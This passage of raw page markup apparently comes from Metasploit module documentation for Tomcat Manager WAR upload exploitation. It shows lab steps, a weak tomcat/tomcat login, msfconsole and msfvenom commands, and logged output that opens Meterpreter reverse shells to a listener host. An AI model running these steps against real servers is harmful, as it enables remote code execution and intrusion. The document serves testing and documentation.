0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat7-7068---ubuntu-server-1604-64bit\" style=\"position:relative;\"><a href=\"#tomcat7-7068---ubuntu-server-1604-64bit\" aria-label=\"tomcat7 7068   ubuntu server 1604 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat7 (7.0.68) - Ubuntu server 16.04 64bit</h3>\n<p>Of note, as of Tomcat 7, the permission role <code class=\"language-text\">manager</code> has been divided into several sub-roles.  Each sub role the user has will change which <code class=\"language-text\">path</code> variable for exploitation.</p>\n<h4 id=\"setup-4\" style=\"position:relative;\"><a href=\"#setup-4\" aria-label=\"setup 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Install Tomcat and dependencies: <code class=\"language-text\">apt-get install tomcat7 tomcat7-admin</code></li>\n</ol>\n<h4 id=\"textscript-interface-exploitation\" style=\"position:relative;\"><a href=\"#textscript-interface-exploitation\" aria-label=\"textscript interface exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>text/script Interface Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">/etc/tomcat7/tomcat-users.xml</code> to add:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-gui&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service if a user was added/changed: <code class=\"language-text\">sudo service tomcat7 restart</code></li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_upload\nmsf exploit(tomcat_mgr_upload) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_upload) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_upload) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.2.118\nrhost =&gt; 192.168.2.118\nmsf exploit(tomcat_mgr_upload) &gt; set rport 8087\nrport =&gt; 8087\nmsf exploit(tomcat_mgr_upload) &gt; check\n\n[*] Tomcat Manager found running on linux platform and x64 architecture\n[!] No active DB -- Credential data will not be saved!\n[*] 192.168.2.118:8087 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Finding CSRF token...\n[*] Uploading and deploying QyjbnIqnn23FOe...\n[*] Uploading 6077 bytes as QyjbnIqnn23FOe.war ...\n[*] Executing QyjbnIqnn23FOe...\n[*] Executing /QyjbnIqnn23FOe/2NFgGA5fk1.jsp...\n[*] Finding CSRF token...\n[*] Undeploying QyjbnIqnn23FOe ...\n[*] Sending stage (49409 bytes) to 192.168.2.118\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.118:33808) at 2017-01-15 20:04:21 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : tomcat\nOS          : Linux 4.4.0-59-generic (amd64)\nMeterpreter : java/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat8-8032---ubuntu-server-1604-64bit\" style=\"position:relative;\"><a href=\"#tomcat8-8032---ubuntu-server-1604-64bit\" aria-label=\"tomcat8 8032   ubuntu server 1604 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat8 (8.0.32) - Ubuntu server 16.04 64bit</h3>\n<p>Of note, as of 7, the permission role 'manager' has been divided into several sub-roles.  The <code class=\"language-text\">manager-gui</code> permission is required for this exploit.</p>\n<h4 id=\"setup-5\" style=\"position:relative;\"><a href=\"#setup-5\" aria-label=\"setup 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li><code class=\"language-text\">apt-get install tomcat8 tomcat8-admin</code></li>\n</ol>\n<h4 id=\"textscript-interface-exploitation-1\" style=\"position:relative;\"><a href=\"#textscript-interface-exploitation-1\" aria-label=\"textscript interface exploitation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>text/script Interface Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">/etc/tomcat8/tomcat-users.xml</code> to add:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-gui&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service if a user was added/changed: <code class=\"language-text\">sudo service tomcat8 restart</code></li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_upload\nmsf exploit(tomcat_mgr_upload) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_upload) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_upload) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.2.118\nrhost =&gt; 192.168.2.118\nmsf exploit(tomcat_mgr_upload) &gt; set rport 8088\nrport =&gt; 8088\nmsf exploit(tomcat_mgr_upload) &gt; check\n\n[*] Tomcat Manager found running on linux platform and x64 architecture\n[*] 192.168.2.118:8088 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Finding CSRF token...\n[*] Uploading and deploying Bjf01M65XUROXL36wmIc85OmtY...\n[*] Uploading 6092 bytes as Bjf01M65XUROXL36wmIc85OmtY.war ...\n[*] Executing Bjf01M65XUROXL36wmIc85OmtY...\n[*] Executing /Bjf01M65XUROXL36wmIc85OmtY/UbPmEhI1wkAf8Yj1rTohvPQWPIADy5.jsp...\n[*] Finding CSRF token...\n[*] Undeploying Bjf01M65XUROXL36wmIc85OmtY ...\n[*] Sending stage (49409 bytes) to 192.168.2.118\n[*] Meterpreter session 3 opened (192.168.2.117:4444 -&gt; 192.168.2.118:33814) at 2017-01-15 20:08:13 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : tomcat\nOS          : Linux 4.4.0-59-generic (amd64)\nMeterpreter : java/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h1 id=\"manual-exploitation\" style=\"position:relative;\"><a href=\"#manual-exploitation\" aria-label=\"manual exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Manual Exploitation</h1>\n<h2 id=\"create-payload\" style=\"position:relative;\"><a href=\"#create-payload\" aria-label=\"create payload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Create payload</h2>\n<p>This was performed on Windows XP with the following permissions as the user that was used to login:</p>\n<ul>\n<li>Tomcat 6.0.48: <code class=\"language-text\">manager</code></li>\n<li>Tomcat 7.0.73: <code class=\"language-text\">manager-gui</code></li>\n<li>Tomcat 8.0.39: <code class=\"language-text\">manager-gui</code></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">/metasploit-framework# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.2.117 LPORT=7777 -f war -o meterp.war\nPayload size: 6072 bytes\nFinal size of war file: 6072 bytes\nSaved as: meterp.war</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"setup-handler\" style=\"position:relative;\"><a href=\"#setup-handler\" aria-label=\"setup handler permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup Handler</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/handler \nmsf exploit(handler) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(handler) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(handler) &gt; set lport 7777\nlport =&gt; 7777\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:7777 \n[*] Starting the payload handler...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"deploy\" style=\"position:relative;\"><a href=\"#deploy\" aria-label=\"deploy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploy</h2>\n<ol>\n<li>With a web browser, browse to <code class=\"language-text\">http://&lt;ip&gt;:&lt;port&gt;/manager/html</code></li>\n<li>Enter credentials (no default)</li>\n<li>Under <code class=\"language-text\">Deploy</code> > <code class=\"language-text\">WAR file to deploy</code>, click browse to select <code class=\"language-text\">meterp.war</code>, click <code class=\"language-text\">Deploy</code></li>\n<li><code class=\"language-text\">meterp</code> should now be listed under <code class=\"language-text\">Applications</code>, meaning it was successfully deployed.</li>\n<li>Either click the link for <code class=\"language-text\">/meterp</code> or browse to <code class=\"language-text\">http://&lt;ip&gt;:&lt;port&gt;/meterp/</code></li>\n</ol>\n<h2 id=\"callback\" style=\"position:relative;\"><a href=\"#callback\" aria-label=\"callback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Callback</h2>\n<p>After browsing to that page, code execution will happen, and your callback will hit.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Starting the payload handler...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 1 opened (192.168.2.117:7777 -&gt; 192.168.2.108:1704) at 2017-01-14 14:53:37 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"manual-cleanup\" style=\"position:relative;\"><a href=\"#manual-cleanup\" aria-label=\"manual cleanup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Manual Cleanup</h2>\n<p>This will NOT remove the meterpreter from Tomcat, click <code class=\"language-text\">Undeploy</code> within the <code class=\"language-text\">Application</code> list to remove <code class=\"language-text\">meterp</code> from Tomcat.</p>"}}},"pageContext":{"id":"021ba252-8a51-5886-8321-b926597ae1eb"}}}